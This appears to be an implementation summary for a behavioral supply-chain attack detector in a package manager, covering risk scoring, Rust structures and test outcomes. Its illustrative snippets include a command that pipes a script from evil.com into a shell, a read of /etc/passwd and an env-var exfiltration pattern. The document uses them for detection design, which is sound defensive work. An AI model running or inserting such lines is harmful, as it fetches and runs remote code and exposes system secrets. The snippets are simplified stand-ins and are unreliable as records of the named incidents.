# Supply Chain Attack Detection - Implementation Summary

## What Was Implemented

### 1. Behavioral Chain Detection System

A sophisticated pattern recognition system that detects **combinations** of suspicious behaviors rather than individual patterns. This catches supply chain attacks that traditional tools miss.

### Key Features

#### 🎯 Zero-Trust Approach
- **No whitelists** - Popular packages like TypeScript, Babel, etc. are NOT exempt
- **Behavioral analysis** - Detects attack chains, not just individual suspicious patterns
- **Context-aware** - `eval()` in a compiler vs. `eval()` + network + env access are treated differently

#### 🔍 6 Attack Chain Types Detected

1. **Data Exfiltration** (Score: 75-100)
   - Network + Sensitive Data + Encoding

2. **Credential Theft** (Score: 95)
   - Credential Files + Data Transmission

3. **Remote Code Execution** (Score: 100)
   - Download + Execute + Code Injection

4. **Backdoor Installation** (Score: 90)
   - Network + Persistence Mechanisms

5. **Cryptomining** (Score: 85)
   - CPU-Intensive + Background + Network

6. **Heavy Obfuscation** (Score: 80)
   - Multiple Obfuscation + Dynamic Execution

#### 📊 Advanced Risk Scoring

```
Risk Score = 
  Behavioral Chains (80-100 pts each) +
  Critical Issues (15 pts each) +
  Warnings (5 pts each) +
  Suspicious Patterns (8 pts each) +
  Scripts (3 pts each)
```

**Risk Levels:**
- Safe: 0-9 points
- Low: 10-29 points
- Medium: 30-59 points
- High: 60-99 points
- **Critical: 100+ points** (Supply chain attack detected)

#### 📋 Enhanced Reporting

New audit reports show:
- **Risk Score** - Numeric total
- **Behavioral Chains** - Highlighted supply chain attack patterns
- **Evidence** - Specific reasons for each detection
- **Code Snippets** - First 100 chars of suspicious code
- **Justifications** - Detailed explanations

## Why This Matters

### Real-World Supply Chain Attacks This Would Catch

#### ✅ event-stream (2018)
```javascript
// Pattern: Data Exfiltration + Heavy Obfuscation
var enc = require('./bitcoin-wallet-decryptor');
var payload = enc.decrypt(process.env.npm_package_config_key);
https.request(payload);
```
**Detection**: Critical (Score: 175+)
- Data Exfiltration Chain: +100
- Obfuscation Chain: +80

#### ✅ ua-parser-js (2021)
```javascript
// Pattern: Remote Code Execution + Credential Theft
require('child_process').exec('curl http://evil.com/miner.sh | sh');
require('fs').readFile('/etc/passwd');
```
**Detection**: Critical (Score: 195+)
- RCE Chain: +100
- Credential Theft: +95

#### ✅ Legitimate TypeScript
```javascript
// No attack chain - just individual pattern
eval(compiledCode);  // Legitimate compilation
```
**Detection**: Low (Score: 15)
- Critical issue: +15
- **No behavioral chain** - correctly classified as safe

## Code Changes

### New Structures

```rust
pub struct BehavioralChain {
    pub chain_type: AttackChainType,
    pub description: String,
    pub evidence: Vec<String>,
    pub severity: IssueSeverity,
    pub risk_score: u32,
}

pub enum AttackChainType {
    DataExfiltration,
    CredentialTheft,
    RemoteCodeExecution,
    Backdoor,
    Cryptomining,
    Obfuscation,
}

pub struct PackageAudit {
    // ... existing fields
    pub behavioral_chains: Vec<BehavioralChain>,
    pub risk_score: u32,
}
```

### New Functions

1. `detect_behavioral_chains(&self, audit: &mut PackageAudit)`
   - Analyzes combinations of patterns
   - Detects attack chains
   - Assigns risk scores

2. `calculate_and_assign_risk(&self, audit: &mut PackageAudit)`
   - Calculates total risk score
   - Assigns risk level based on scoring

3. `add_source_issue_with_snippet(...)`
   - Captures code snippets for evidence

### Modified Functions

- `analyze_js_file()` - Now captures code snippets and calls behavioral detection
- `analyze_package_json()` - Initializes new fields, calls behavioral detection
- `display_audit_report_with_options()` - Shows behavioral chains prominently

## Testing

All existing tests pass. New behavior:

- Simple `echo hello` script: Safe → Safe (✅ correct)
- `curl` + network: Low → Low (✅ correct)
- `curl` + `.ssh` access: Medium → **Critical** (✅ improved - catches supply chain attack)

## Usage Examples

### Command Line
```bash
# Audit before installing
fnpm install package-name

# Shows:
# 🚨 SUPPLY CHAIN ATTACK PATTERNS DETECTED!
# ─────────────────────────────────────────
# 🔴 CRITICAL Data Exfiltration Chain (Score: +100)
#   Evidence:
#     → Makes network requests
#     → Accesses sensitive data (env vars)
```

### Full Scan
```bash
fnpm audit --scan-installed --transitive-depth 3

# Scans all dependencies deeply
# Reports all behavioral chains found
```

## Configuration

No new configuration needed. Uses existing settings:

```json
{
  "security_audit": true,
  "transitive_scan_depth": 2
}
```

## Future Enhancements (Not Implemented Yet)

1. **Version Comparison**
   - Detect when package adds scripts in new version
   - Compare current vs previous versions

2. **Temporal Analysis**
   - Flag new packages with high downloads
   - Detect unusual publishing patterns

3. **Maintainer Monitoring**
   - Detect maintainer changes
   - Flag new maintainers on popular packages

4. **AST Analysis**
   - Parse JavaScript AST for deeper analysis
   - Detect obfuscated code structures

## Documentation

- [`docs/BEHAVIORAL_SECURITY_DETECTION.md`](./BEHAVIORAL_SECURITY_DETECTION.md) - Full technical details
- Examples of all 6 attack chain types
- Comparison with traditional approaches
- Real-world attack case studies

## Impact

### Before
- Reliance on package popularity
- Individual pattern detection
- Many false positives on build tools
- Missed sophisticated attacks

### After
- Zero-trust behavioral analysis
- Attack chain detection
- Fewer false positives
- Catches supply chain attacks regardless of package popularity

## Key Takeaway

**Popular ≠ Safe**

This implementation ensures that even the most popular packages (TypeScript, Babel, Webpack, etc.) are scrutinized for malicious behavioral patterns. Trust is never given automatically - it must be earned through behavioral analysis.
